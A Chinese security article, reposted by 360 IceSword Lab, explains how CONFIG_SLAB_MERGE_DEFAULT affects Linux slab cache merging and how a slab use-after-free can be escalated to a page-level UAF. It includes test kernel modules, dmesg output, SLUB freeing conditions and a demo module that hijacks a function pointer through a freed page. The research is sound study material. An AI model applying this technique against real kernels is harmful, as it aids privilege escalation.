@@ -1,0 +1,600 @@
+# Linux 内核利用技巧: Slab UAF to Page UAF
+
+阅读量 **112606**
+
+发布时间 : 2023-02-03 10:30:18
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+author: 熊潇 of [IceSword Lab](https://www.iceswordlab.com/about/)
+
+本文研究了内核编译选项 `CONFIG_SLAB_MERGE_DEFAULT` 对 `kmem_cache` 分配的影响.
+
+以及开启该配置的时候, slab UAF 的一种利用方案 ([方案来源](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/), 本文内容基于 Linux-5.10.90).
+
+阅读前, 需要对 slab/slub, Buddy system 有基本的了解.
+
+  * Part. 1: 源码分析
+  * Part. 2: `CONFIG_SLAB_MERGE_DEFAULT` 配置对比测试
+  * Part. 3: 跨 slab 的 UAF 利用示例
+
+## Part. 1
+
+创建 `struct kmem_cache` 的时候，有两种情况:
+
+  * `__kmem_cache_alias` : 跟现有的共用（mergeable）
+  * `create_cache` : 创建一个新的
+
+    
+    
+    kmem_cache_create(..)
+        kmem_cache_create_usercopy(..)
+            if (!usersize) // usersize == 0
+                s = __kmem_cache_alias(name, size, align, flags, ctor); // s 为 NULL 才会创建新的 slab
+            if (s)
+                goto out_unlock;
+            create_cache()
+    
+    // 进入 `__kmem_cache_alias` 看看
+    __kmem_cache_alias(..)
+        // 检查 CONFIG_SLAB_MERGE_DEFAULT 配置；
+        // 如果开启了，则通过 sysfs_slab_alias 找到已经创建的相同大小的 slab 作为替代
+        s = find_mergeable(..)
+            list_for_each_entry_reverse(s, &slab_caches, list) {
+                if (slab_unmergeable(s)) // slab_nomerge 为 true 时 return 1;
+                    continue; 
+                 ...
+                 return s;
+            }
+            return NULL; // slab_nomerge 为 true 的时候返回 NULL
+        if(s)           
+           ... 
+           sysfs_slab_alias(..)
+        return s;
+    
+    // CONFIG_SLAB_MERGE_DEFAULT=y -> slab_nomerge == false
+    // CONFIG_SLAB_MERGE_DEFAULT=n -> slab_nomerge == true
+    static bool slab_nomerge = !IS_ENABLED(CONFIG_SLAB_MERGE_DEFAULT);
+    
+    // https://cateee.net/lkddb/web-lkddb/SLAB_MERGE_DEFAULT.html
+    // CONFIG_SLAB_MERGE_DEFAULT: Allow slab caches to be merged
+    
+    // For reduced kernel memory fragmentation, slab caches can be merged 
+    // when they share the same size and other characteristics. 
+    // This carries a risk of kernel heap overflows being able to 
+    // overwrite objects from merged caches (and more easily control cache layout), 
+    // which makes such heap attacks easier to exploit by attackers.
+    
+
+## Part.2
+
+测试 `CONFIG_SLAB_MERGE_DEFAULT` 的影响
+
+Host 主机(开启了配置)：
+
+    
+    
+    └─[$] uname -r
+    5.15.0-52-generic
+    
+    └─[$] cat /boot/config-$(uname -r) |grep CONFIG_SLAB_MERGE_DEFAULT      
+    CONFIG_SLAB_MERGE_DEFAULT=y
+    
+
+VM (未开启配置):
+
+    
+    
+    ➜  ~ uname -r
+    5.10.90
+    
+    └─[$] cat .config|grep CONFIG_SLAB_MERGE_DEFAULT       
+    # CONFIG_SLAB_MERGE_DEFAULT is not set
+    
+
+  * code 
+    
+          #include <linux/module.h>
+      #include <linux/kernel.h>
+      #include <linux/init.h>
+      #include <linux/mm.h>
+      #include <linux/slab.h>
+      #include <linux/slub_def.h>
+      #include <linux/sched.h>
+    
+      #define OBJ_SIZE 256
+      #define OBJ_NUM ((PAGE_SIZE/OBJ_SIZE) * 3)
+    
+      struct my_struct {
+          char data[OBJ_SIZE];
+      };
+    
+      static struct kmem_cache *my_cachep;
+      static struct my_struct *ms[OBJ_NUM];
+    
+      static int __init km_init(void){
+          int i, cpu;
+          struct kmem_cache_cpu *c;
+          struct page *pg;
+    
+          pr_info("Hello\n");
+    
+              my_cachep = kmem_cache_create("my_struct",
+                  sizeof(struct my_struct), 0,
+                  SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT,
+                  NULL);
+    
+          pr_info("my_cachep: %px, %s\n", my_cachep, my_cachep->name);
+          pr_info("my_cachep.size: %u\n", my_cachep->size);
+          pr_info("my_cachep.object_size: %u\n", kmem_cache_size(my_cachep));
+    
+          cpu = get_cpu();
+          pr_info("cpu: %d\n", cpu);
+    
+          c = per_cpu_ptr(my_cachep->cpu_slab, cpu);
+    
+          for(i = 0; i<OBJ_NUM; i++){
+              ms[i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);
+              pg = virt_to_page(ms[i]);
+              pr_info("[%02d] object: %px, page: %px(%px), %d\n", i, ms[i],
+                      pg, page_address(pg),
+                      (void *)pg == (void *)c->page);
+          }
+    
+          return 0;
+    
+      }
+    
+      static void __exit km_exit(void)
+      {
+          int i;
+    
+          for( i = 0; i<OBJ_NUM; i++){
+              kmem_cache_free(my_cachep, ms[i]);
+          }
+          kmem_cache_destroy(my_cachep);
+          pr_info("Bye\n");
+      }
+    
+      module_init(km_init);
+      module_exit(km_exit);
+    
+      MODULE_LICENSE("GPL");
+      MODULE_AUTHOR("X++D");
+      MODULE_DESCRIPTION("Kernel xxx Module.");
+      MODULE_VERSION("0.1");
+    
+
+  * VM result 
+
+分配的 object 地址和 page 的关系非常清晰
+
+    
+          ➜  ~ insmod slab-tc.ko
+      [ 1184.983757] Hello
+      [ 1184.984278] my_cachep: ffff8880096ea000, my_struct
+      [ 1184.985568] my_cachep.size: 256
+      [ 1184.986451] my_cachep.object_size: 256
+      [ 1184.987488] cpu: 0
+      **[ 1184.988945] [00] object: ffff888005c38000, page: ffffea0000170e00(ffff888005c38000), 1**
+      [ 1184.991189] [01] object: ffff888005c38100, page: ffffea0000170e00(ffff888005c38000), 1
+      [ 1184.993438] [02] object: ffff888005c38200, page: ffffea0000170e00(ffff888005c38000), 1
+      [ 1184.995688] [03] object: ffff888005c38300, page: ffffea0000170e00(ffff888005c38000), 1
+      [ 1184.998018] [04] object: ffff888005c38400, page: ffffea0000170e00(ffff888005c38000), 1
+      [ 1185.000234] [05] object: ffff888005c38500, page: ffffea0000170e00(ffff888005c38000), 1
+      [ 1185.002529] [06] object: ffff888005c38600, page: ffffea0000170e00(ffff888005c38000), 1
+      [ 1185.004702] [07] object: ffff888005c38700, page: ffffea0000170e00(ffff888005c38000), 1
+      [ 1185.006841] [08] object: ffff888005c38800, page: ffffea0000170e00(ffff888005c38000), 1
+      [ 1185.008919] [09] object: ffff888005c38900, page: ffffea0000170e00(ffff888005c38000), 1
+      [ 1185.010944] [10] object: ffff888005c38a00, page: ffffea0000170e00(ffff888005c38000), 1
+      [ 1185.013021] [11] object: ffff888005c38b00, page: ffffea0000170e00(ffff888005c38000), 1
+      [ 1185.014904] [12] object: ffff888005c38c00, page: ffffea0000170e00(ffff888005c38000), 1
+      [ 1185.016926] [13] object: ffff888005c38d00, page: ffffea0000170e00(ffff888005c38000), 1
+      [ 1185.018883] [14] object: ffff888005c38e00, page: ffffea0000170e00(ffff888005c38000), 1
+      **[ 1185.020761] [15] object: ffff888005c38f00, page: ffffea0000170e00(ffff888005c38000), 1**
+      **[ 1185.022735] [16] object: ffff88800953d000, page: ffffea0000254f40(ffff88800953d000), 1**
+      [ 1185.024679] [17] object: ffff88800953d100, page: ffffea0000254f40(ffff88800953d000), 1
+      [ 1185.026579] [18] object: ffff88800953d200, page: ffffea0000254f40(ffff88800953d000), 1
+      [ 1185.028528] [19] object: ffff88800953d300, page: ffffea0000254f40(ffff88800953d000), 1
+      [ 1185.030443] [20] object: ffff88800953d400, page: ffffea0000254f40(ffff88800953d000), 1
+      [ 1185.032372] [21] object: ffff88800953d500, page: ffffea0000254f40(ffff88800953d000), 1
+      [ 1185.034263] [22] object: ffff88800953d600, page: ffffea0000254f40(ffff88800953d000), 1
+      [ 1185.036116] [23] object: ffff88800953d700, page: ffffea0000254f40(ffff88800953d000), 1
+      [ 1185.038086] [24] object: ffff88800953d800, page: ffffea0000254f40(ffff88800953d000), 1
+      [ 1185.039929] [25] object: ffff88800953d900, page: ffffea0000254f40(ffff88800953d000), 1
+      [ 1185.041944] [26] object: ffff88800953da00, page: ffffea0000254f40(ffff88800953d000), 1
+      [ 1185.043852] [27] object: ffff88800953db00, page: ffffea0000254f40(ffff88800953d000), 1
+      [ 1185.045736] [28] object: ffff88800953dc00, page: ffffea0000254f40(ffff88800953d000), 1
+      [ 1185.047678] [29] object: ffff88800953dd00, page: ffffea0000254f40(ffff88800953d000), 1
+      [ 1185.049585] [30] object: ffff88800953de00, page: ffffea0000254f40(ffff88800953d000), 1
+      **[ 1185.051391] [31] object: ffff88800953df00, page: ffffea0000254f40(ffff88800953d000), 1**
+      **[ 1185.053206] [32] object: ffff888009543000, page: ffffea00002550c0(ffff888009543000), 1**
+      [ 1185.055038] [33] object: ffff888009543100, page: ffffea00002550c0(ffff888009543000), 1
+      [ 1185.056666] [34] object: ffff888009543200, page: ffffea00002550c0(ffff888009543000), 1
+      [ 1185.058430] [35] object: ffff888009543300, page: ffffea00002550c0(ffff888009543000), 1
+      [ 1185.060174] [36] object: ffff888009543400, page: ffffea00002550c0(ffff888009543000), 1
+      [ 1185.061955] [37] object: ffff888009543500, page: ffffea00002550c0(ffff888009543000), 1
+      [ 1185.063694] [38] object: ffff888009543600, page: ffffea00002550c0(ffff888009543000), 1
+      [ 1185.065468] [39] object: ffff888009543700, page: ffffea00002550c0(ffff888009543000), 1
+      [ 1185.067231] [40] object: ffff888009543800, page: ffffea00002550c0(ffff888009543000), 1
+      [ 1185.068930] [41] object: ffff888009543900, page: ffffea00002550c0(ffff888009543000), 1
+      [ 1185.070600] [42] object: ffff888009543a00, page: ffffea00002550c0(ffff888009543000), 1
+      [ 1185.072224] [43] object: ffff888009543b00, page: ffffea00002550c0(ffff888009543000), 1
+      [ 1185.073911] [44] object: ffff888009543c00, page: ffffea00002550c0(ffff888009543000), 1
+      [ 1185.075534] [45] object: ffff888009543d00, page: ffffea00002550c0(ffff888009543000), 1
+      [ 1185.077211] [46] object: ffff888009543e00, page: ffffea00002550c0(ffff888009543000), 1
+      **[ 1185.078887] [47] object: ffff888009543f00, page: ffffea00002550c0(ffff888009543000), 1**
+    
+
+有独立的 sysfs 目录
+
+    
+          ➜  ~ file /sys/kernel/slab/my_struct
+      /sys/kernel/slab/my_struct: directory
+    
+      ➜  ~ file /sys/kernel/slab/pool_workqueue
+      /sys/kernel/slab/pool_workqueue: directory
+    
+
+  * Host result 
+
+分配的 obj 位于的 page 地址非常杂乱，`my_cachep` 的 `name` 也变成了 `pool_workqueue`
+
+    
+          [435532.063645] Hello
+      [435532.063655] my_cachep: ffff8faf40045900, pool_workqueue
+      [435532.063658] my_cachep.size: 256
+      [435532.063659] my_cachep.object_size: 256
+      [435532.063660] cpu: 0
+      [435532.063662] [00] object: ffff8fafb100b400, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063664] [01] object: ffff8fafb100a700, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063666] [02] object: ffff8fafb100ae00, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063668] [03] object: ffff8fafb100b900, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063670] [04] object: ffff8fafb100be00, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063672] [05] object: ffff8fafb100bf00, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063674] [06] object: ffff8fafb100af00, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063676] [07] object: ffff8fafb100ad00, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063677] [08] object: ffff8fafb100bc00, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063679] [09] object: ffff8fafb100a600, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063681] [10] object: ffff8fafb100a800, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063683] [11] object: ffff8fafb100a000, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063685] [12] object: ffff8fafb100ab00, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063687] [13] object: ffff8fafb100b300, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063689] [14] object: ffff8fafb100a900, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063690] [15] object: ffff8fafb100b000, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063692] [16] object: ffff8fafb100a100, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063694] [17] object: ffff8fafb100b100, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063696] [18] object: ffff8fafb100b500, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063698] [19] object: ffff8fafb100bd00, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063700] [20] object: ffff8fafb100ba00, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063702] [21] object: ffff8fafb100b700, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063703] [22] object: ffff8fafb100a200, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063705] [23] object: ffff8fafb100b200, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063707] [24] object: ffff8fafb100bb00, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063709] [25] object: ffff8fafb100aa00, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063711] [26] object: ffff8fafb100a500, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063713] [27] object: ffff8fafb100b600, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063714] [28] object: ffff8fafb100b800, page: ffffd50545c402c0(ffff8fafb100b000), 0
+      [435532.063716] [29] object: ffff8fafb100a400, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063718] [30] object: ffff8fafb100ac00, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063720] [31] object: ffff8fafb100a300, page: ffffd50545c40280(ffff8fafb100a000), 1
+      [435532.063724] [32] object: ffff8faf488fec00, page: ffffd50544223f80(ffff8faf488fe000), 1
+      [435532.063726] [33] object: ffff8faf488fe400, page: ffffd50544223f80(ffff8faf488fe000), 1
+      [435532.063728] [34] object: ffff8faf488ff800, page: ffffd50544223fc0(ffff8faf488ff000), 0
+      [435532.063730] [35] object: ffff8faf488ff600, page: ffffd50544223fc0(ffff8faf488ff000), 0
+      [435532.063732] [36] object: ffff8faf488fe500, page: ffffd50544223f80(ffff8faf488fe000), 1
+      [435532.063734] [37] object: ffff8faf488fea00, page: ffffd50544223f80(ffff8faf488fe000), 1
+      [435532.063736] [38] object: ffff8faf488ffb00, page: ffffd50544223fc0(ffff8faf488ff000), 0
+      [435532.063737] [39] object: ffff8faf488ff200, page: ffffd50544223fc0(ffff8faf488ff000), 0
+      [435532.063739] [40] object: ffff8faf488fe200, page: ffffd50544223f80(ffff8faf488fe000), 1
+      [435532.063741] [41] object: ffff8faf488ff700, page: ffffd50544223fc0(ffff8faf488ff000), 0
+      [435532.063743] [42] object: ffff8faf488ffa00, page: ffffd50544223fc0(ffff8faf488ff000), 0
+      [435532.063745] [43] object: ffff8faf488ff400, page: ffffd50544223fc0(ffff8faf488ff000), 0
+      [435532.063747] [44] object: ffff8faf488fe700, page: ffffd50544223f80(ffff8faf488fe000), 1
+      [435532.063749] [45] object: ffff8faf488fee00, page: ffffd50544223f80(ffff8faf488fe000), 1
+      [435532.063750] [46] object: ffff8faf488ff900, page: ffffd50544223fc0(ffff8faf488ff000), 0
+      [435532.063752] [47] object: ffff8faf488ffe00, page: ffffd50544223fc0(ffff8faf488ff000), 0
+      [435532.065672] Bye
+    
+
+sysfs 目录也是和 `pool_workqueue` 共用的
+
+    
+          └─[$] file /sys/kernel/slab/my_struct              
+      /sys/kernel/slab/my_struct: symbolic link to :0000256
+    
+      └─[$] file /sys/kernel/slab/pool_workqueue 
+      /sys/kernel/slab/pool_workqueue: symbolic link to :0000256
+    
+
+## Part. 3
+
+根据前两个部分知道，开启 `CONFIG_SLAB_MERGE_DEFAULT` 配置后，不同类型的 `kmem_cache` 的内存完全隔离.
+
+这种情况下，想要占据被释放的 slab object 内存(比如一个 `struct file`) 只能通过申请相同的 slab object,
+
+而像 `struct file` 这样的内存，用户态可以操纵的内容非常有限,
+
+解决办法是: 占据目标 object (e.g. `struct file`) 所在的整个 page，在 object invalid free 之后
+free 掉同页面其他 object，再满足[一系列条件](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#how-to-free-a-page) 就可以让整个
+page 被 buddy system 回收，并被重新申请
+
+* * *
+
+**条件一:**
+
+目标 object 所在的 page 不是 `s->cpu_slab->page`
+
+    
+    
+    static __always_inline void do_slab_free(struct kmem_cache *s,
+                    struct page *page, void *head, void *tail,
+                    int cnt, unsigned long addr)
+    {
+    ...
+        c = raw_cpu_ptr(s->cpu_slab);
+    ...
+        **if (likely(page == c->page)) {**
+        ...
+        } else
+          __slab_free(s, page, head, tail_obj, cnt, addr);
+        ...
+    
+
+**条件二:**
+
+object 所在 page 满足 `page->pobjects > (s)->cpu_partial`
+
+    
+    
+    // #define slub_cpu_partial(s) ((s)->cpu_partial)
+    static void put_cpu_partial(struct kmem_cache *s, struct page *page, int drain)
+    ...
+        oldpage = this_cpu_read(s->cpu_slab->partial);
+        pobjects = oldpage->pobjects;
+        **if (drain && pobjects > slub_cpu_partial(s)) {**
+            ...
+            unfreeze_partials(s, this_cpu_ptr(s->cpu_slab));
+    
+
+**条件三:**
+
+object 所在 page 位于 `freelist` 且 `page.inuse`为 0
+
+    
+    
+    static void unfreeze_partials(struct kmem_cache *s,
+            struct kmem_cache_cpu *c)
+    {
+    ...
+            while ((page = slub_percpu_partial(c))) {
+    ...
+                    **if (unlikely(!new.inuse && n->nr_partial >= s->min_partial)) {**
+                page->next = discard_page;
+                **discard_page = page;**
+            } else {
+    ...
+            }
+          }
+    ...
+            while (discard_page) {
+            page = discard_page;
+            discard_page = discard_page->next;
+    
+            stat(s, DEACTIVATE_EMPTY);
+            **discard_slab(s, page);**
+            stat(s, FREE_SLAB);
+        }
+    
+
+* * *
+
+**触发方法:**
+
+  * 创建一批 objects 占满 cpu_partial + 2 个 pages, 保证 free 的时候 `page->pobjects > (s)->cpu_partial`
+  * 创建 objects 占据一个新的 page ，但不占满，保证 `c->page` 指向这个 page
+  * free 掉一个 page 的所有 objects, 使这个 page 的 `page.inuse == 0`
+  * 剩下的每个 page free 一个 object 用完 partial list 后就会 free 掉目标 page
+
+代码如下:
+
+    
+    
+    /*
+     *
+     * 通过 free slab objects free 掉一个 page, 然后 UAF 利用
+     *
+    ➜  ~ uname -r
+    5.10.90
+     * */
+    #include <linux/module.h>
+    #include <linux/kernel.h>
+    #include <linux/init.h>
+    #include <linux/mm.h>
+    #include <linux/slab.h>
+    #include <linux/slub_def.h>
+    #include <linux/sched.h>
+    
+    
+    #define OBJ_SIZE 256
+    #define OBJ_NUM (16 * 16)
+    
+    struct my_struct {
+        union {
+            char data[OBJ_SIZE];
+            struct {
+                void (*func)(void);
+                char paddings[OBJ_SIZE - 8];
+            };
+        };
+    } __attribute__((aligned(OBJ_SIZE)));
+    
+    static struct kmem_cache *my_cachep;
+    struct my_struct **tmp_ms;
+    struct my_struct *ms;
+    struct my_struct *random_ms;
+    struct page *target;
+    
+    
+    void hello_func(void){
+        pr_info("Hello\n");
+    }
+    
+    void hack_func(void){
+        pr_info("Hacked\n");
+    }
+    
+    static int __init km_init(void){
+    #define OO_SHIFT    16
+    #define OO_MASK     ((1 << OO_SHIFT) - 1)
+        int i, cpu_partial, objs_per_slab;
+        struct page *target;
+        struct page *realloc;
+        void *p;
+    
+        tmp_ms = kmalloc(OBJ_NUM * 8, GFP_KERNEL);
+        my_cachep = kmem_cache_create("my_struct", sizeof(struct my_struct), 0,
+        SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT,NULL);
+    
+        pr_info("%s\n", my_cachep->name);
+        pr_info("cpu_partial: %d\n", my_cachep->cpu_partial);
+        pr_info("objs_per_slab: %u\n", my_cachep->oo.x & OO_MASK);
+        pr_info("\n");
+    
+        cpu_partial = my_cachep->cpu_partial;
+        objs_per_slab = my_cachep->oo.x & OO_MASK;
+    
+        random_ms = kmem_cache_alloc(my_cachep, GFP_KERNEL);
+    
+        // 16 * 14
+        for(i = 0; i < (objs_per_slab * (cpu_partial + 1)); i++){
+            tmp_ms[i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);
+        }
+    
+        // 15
+        for(i = (objs_per_slab * (cpu_partial + 1));
+                i < objs_per_slab * (cpu_partial + 2) - 1; i++){
+            tmp_ms[i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);
+        }
+    
+        // free normal object
+        ms = kmem_cache_alloc(my_cachep, GFP_KERNEL);
+        target = virt_to_page(ms);
+        pr_info("target page: %px\n", target);
+        ms->func = (void *)hello_func;
+        ms->func();
+        kmem_cache_free(my_cachep, ms);
+    
+        // 17
+        for(i = objs_per_slab * (cpu_partial + 2) - 1;
+                i < objs_per_slab * (cpu_partial + 2) - 1 + (objs_per_slab + 1); i++){
+            tmp_ms[i] = kmem_cache_alloc(my_cachep, GFP_KERNEL);
+        }
+    
+            // free page
+        for(i = (objs_per_slab * (cpu_partial + 1));
+                i < objs_per_slab * (cpu_partial + 2) - 1; i++){
+    
+            kmem_cache_free(my_cachep, tmp_ms[i]);
+            tmp_ms[i] = NULL;
+        }
+    
+        for(i = objs_per_slab * (cpu_partial + 2) - 1;
+                i < objs_per_slab * (cpu_partial + 2) - 1 + (objs_per_slab + 1); i++){
+            kmem_cache_free(my_cachep, tmp_ms[i]);
+            tmp_ms[i] = NULL;
+        }
+    
+        for(i = 0; i < (objs_per_slab * (cpu_partial + 1)); i++){
+            if(i % objs_per_slab == 0){
+                kmem_cache_free(my_cachep, tmp_ms[i]);
+                tmp_ms[i] = NULL;
+            }
+        }
+    
+        // in other evil task
+        realloc = alloc_page(GFP_KERNEL);
+        if(realloc == target){
+            pr_info("[+] Realloc success!!!\n");
+        }else{
+            return 0;
+        }
+    
+        p = page_address(realloc);
+        for(i = 0; i< PAGE_SIZE/8; i++){
+            ((void **)p)[i] = (void *)hack_func;
+        }
+    
+        // UAF
+        if(0)
+            return;
+        else
+            ms->func();
+    
+        free_page((unsigned long)p);
+    
+        return 0;
+    
+    }
+    
+    static void __exit km_exit(void)
+    {
+        int i;
+    
+        for(i = 0; i < OBJ_NUM; i++){
+            if(tmp_ms[i])
+                kmem_cache_free(my_cachep, tmp_ms[i]);
+        }
+        kmem_cache_free(my_cachep, random_ms);
+        kmem_cache_destroy(my_cachep);
+        kfree(tmp_ms);
+        pr_info("Bye\n");
+    }
+    
+    
+    module_init(km_init);
+    module_exit(km_exit);
+    
+    MODULE_LICENSE("GPL");
+    MODULE_AUTHOR("X++D");
+    MODULE_DESCRIPTION("Kernel xxx Module.");
+    MODULE_VERSION("0.1");
+    
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **360冰刃实验室** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/285919](/post/id/285919)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [linux kernel exploit](/tag/linux kernel exploit)
+  * [slab/slub](/tag/slab/slub)
+  * [CONFIG_SLAB_MERGE_DEFAULT](/tag/CONFIG_SLAB_MERGE_DEFAULT)
+
+ **+1** __1赞
+
+ __收藏
+
+![](https://p1.ssl.qhimg.com/t016d438783a0ea493a.png) 360冰刃实验室
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
